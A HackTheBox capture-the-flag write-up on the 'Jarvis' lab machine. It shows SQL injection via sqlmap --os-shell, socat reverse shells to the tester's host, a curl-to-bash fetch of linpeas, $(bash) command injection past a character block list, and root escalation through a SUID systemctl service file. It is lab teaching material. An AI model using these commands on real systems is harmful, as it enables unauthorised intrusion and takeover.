---
title: "Jarvis - HackTheBox"
date: "2019-11-09"
tags: [SQL injection, systemctl, misconfiguration, SUID]
---

## Information gathering

Let's run a quick nmap scan:
```
$ nmap -A -T4 10.10.10.143
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 20:09 EDT
Nmap scan report for 10.10.10.143
Host is up (0.056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds
```

## Exploration

The website is a hotel presentation and trying to run `gobuster` on it get us
banned and the site will respond with this message:

> Hey you have been banned for 90 seconds, don't be bad

Nevermind, let's wait a bit.

Exploring the website, we can see that the link to each room uses a `GET`
parameter to indicate the number of the room, for example:
```
http://10.10.10.143/room.php?cod=1
```
We can try to see if it's vulnerable to `SQL` injection by visiting the
following URL:
```
http://10.10.10.143/room.php?cod=1337 or 1=1
```
It will return the first room even if the `cod` parameter does not match,
because the `or 1=1` condition, makes the query looks like (it's an assumption):
```
SELECT * FROM rooms where code = 1337 or 1=1
```

## Getting a shell

We can try to get a shell using `sqlmap` by using the `--os-shell` option:
```
sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell --random-agent
```
![](/images/hackthebox/jarvis/www-data-shell.png)

And it does work! We have a shell as `www-data` user.

We can get a better shell than this one by running a `socat` listener on our
machine with this command:
```
$ socat file:`tty`,raw,echo=0 tcp-listen:1337
```
and connect to it with this command:
```
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:1337
```

## Further enumeration

The following step is to run an enumeration script on the machine, I choose 
[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

So after running a web server on our machine with `python2.7 -m SimpleHTTPServer
8080` let's run the script on the remote machine with `curl
http://10.10.14.8:8080/linpeas.sh | bash`.

There seems to be an interesting command that we can run as the user `pepper`
without providing it's password:
![](/images/hackthebox/jarvis/simpler.png)

Here's the code of `simpler.py` (I removed the useless parts):
```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

It's a wrapper to the `ping` command, and it basically pings any host that we
provide as input. There are some characters that we can not use as input, but
luckily we can use `$`, `(` and `)`.  
We can easily get a shell by using `$(bash)` as the ip to connect to:
![](/images/hackthebox/jarvis/user-shell.png)

And then let's get the flag:
```
pepper@jarvis:/var/www/Admin-Utilities$ cat /home/pepper/user.txt
2afa36c4f05b37b34259c93551f5c44f
```

## Privilege escalation

By running again `linpeas.sh` we stumble upon an unusual executable who has the
`SUID` bit set, `systemctl`. We can exploit this to run any command as `root`, so
let's create a `systemd` service file that will gets us a reverse shell:
```
[Service]
Type=oneshot
ExecStart=/bin/bash -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:1338"
[Install]
WantedBy=multi-user.target
```
And after setting up our `socat` listener, let's install and run the service:
```
$ systemctl link /home/pepper/shell.service
$ systemctl enable --now /home/pepper/shell.service
```

And here's our shell! Let's get the flag:
```
$ socat file:`tty`,raw,echo=0 tcp-listen:1338
root@jarvis:/# cat /root/root.txt
d41d8cd98f00b204e9800998ecf84271
```

See you in the next one! Thanks for reading!
